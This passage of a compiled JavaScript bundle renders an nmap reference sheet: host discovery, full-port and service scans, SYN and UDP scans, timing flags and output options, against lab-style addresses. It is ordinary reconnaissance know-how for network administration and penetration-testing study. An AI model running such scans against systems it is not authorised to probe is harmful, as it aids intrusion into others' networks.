ports.</td></tr><tr><td><code>--stats-every=5s</code></td><td>Displays scan’s status every 5 seconds.</td></tr><tr><td><code>-v/-vv</code></td><td>Displays verbose output during the scan.</td></tr><tr><td><code>--initial-rtt-timeout 50ms</code></td><td>Sets the specified time value as initial RTT timeout.</td></tr><tr><td><code>--max-rtt-timeout 100ms</code></td><td>Sets the specified time value as maximum RTT timeout.</td></tr><tr><td><code>--min-rate 300</code></td><td>Sets the number of packets that will be sent simultaneously.</td></tr><tr><td><code>-T &lt;0-5&gt;</code></td><td>Specifies the specific timing template.</td></tr></tbody></table>`,1);function ya(e){var s=ia(),l=a(b(s),12);n(l,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">nmap</span><span style="color:#79C0FF"> -sp</span><span style="color:#A5D6FF"> 192.168.5.0/24</span></span></code></pre>');var o=a(l,4);n(o,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#A5D6FF"> 10.129.2.0/24</span><span style="color:#79C0FF"> -sn</span><span style="color:#79C0FF"> -oA</span><span style="color:#A5D6FF"> tnet</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> grep</span><span style="color:#A5D6FF"> for</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> cut</span><span style="color:#79C0FF"> -d</span><span style="color:#A5D6FF">" "</span><span style="color:#79C0FF"> -f5</span></span></code></pre>');var p=a(o,6);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">ports</span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3">$(</span><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -Pn</span><span style="color:#79C0FF"> -p-</span><span style="color:#79C0FF"> --min-rate=1000</span><span style="color:#79C0FF"> -T4</span><span style="color:#79C0FF"> 10.10.10.95</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> grep</span><span style="color:#A5D6FF"> ^[0-9]</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> cut</span><span style="color:#79C0FF"> -d</span><span style="color:#A5D6FF"> '/'</span><span style="color:#79C0FF"> -f</span><span style="color:#79C0FF"> 1</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> tr</span><span style="color:#A5D6FF"> '&#92;n'</span><span style="color:#A5D6FF"> ','</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> sed</span><span style="color:#A5D6FF"> s/,</span><span style="color:#E6EDF3">$</span><span style="color:#A5D6FF">//</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#FFA657">nmap</span><span style="color:#79C0FF"> -Pn</span><span style="color:#79C0FF"> -p</span><span style="color:#E6EDF3">$ports</span><span style="color:#79C0FF"> -sC</span><span style="color:#79C0FF"> -sV</span><span style="color:#79C0FF"> 10.10.10.95</span></span></code></pre>`);var t=a(p,6);n(t,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -Pn</span><span style="color:#79C0FF"> -p-</span><span style="color:#79C0FF"> --min-rate</span><span style="color:#79C0FF"> 5000</span><span style="color:#79C0FF"> -T4</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ip</span><span style="color:#A5D6FF"> addres</span><span style="color:#E6EDF3">s</span><span style="color:#FF7B72">></span></span></code></pre>');var r=a(t,6);n(r,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -Pn</span><span style="color:#79C0FF"> -sS</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ip</span><span style="color:#A5D6FF"> addres</span><span style="color:#E6EDF3">s</span><span style="color:#FF7B72">></span></span></code></pre>');var c=a(r,4);n(c,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -Pn</span><span style="color:#79C0FF"> -sU</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ip</span><span style="color:#A5D6FF"> addres</span><span style="color:#E6EDF3">s</span><span style="color:#FF7B72">></span></span></code></pre>');var y=a(c,6);n(y,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">nmap</span><span style="color:#79C0FF"> -n</span><span style="color:#79C0FF"> -sn</span><span style="color:#79C0FF"> -PR</span><span style="color:#79C0FF"> --packet-trace</span><span style="color:#79C0FF"> --send-eth</span><span style="color:#79C0FF"> 192.168.33.37</span></span></code></pre>');var u=a(y,6);n(u,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -sV</span><span style="color:#79C0FF"> -Pn</span><span style="color:#79C0FF"> -p-</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ip</span><span style="color:#A5D6FF"> addres</span><span style="color:#E6EDF3">s</span><span style="color:#FF7B72">></span></span></code></pre>');var E=a(u,6);n(E,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -A</span><span style="color:#79C0FF"> -sV</span><span style="color:#79C0FF"> -sC</span><span style="color:#79C0FF"> -p-</span><span style="color:#79C0FF"> -Pn</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ip</span><span style="color:#A5D6FF"> addres</span><span style="color:#E6EDF3">s</span><span style="color:#FF7B72">></span></span></code></pre>');var f=a(E,4);n(f,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -iL</span><span style="color:#A5D6FF"> hosts.txt</span></span></code></pre>');var F=a(f,4);n(F,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> nmap</span><span style="color:#79C0FF"> -oN</span><span style="color:#A5D6FF"> file.txt</span></span></code></pre>'),S(6),g(e,s)}const _a=Object.freeze(Object.defineProperty({__proto__:null,default:ya,metadata:Fa},Symbol.toStringTag,{value:"Module"}));export{fa as _,Ca as a,ma as b,ba as c,ga as d,ha as e,Ba as f,va as g,Aa as h,wa as i,xa as j,ka as k,_a as l,ua as m};
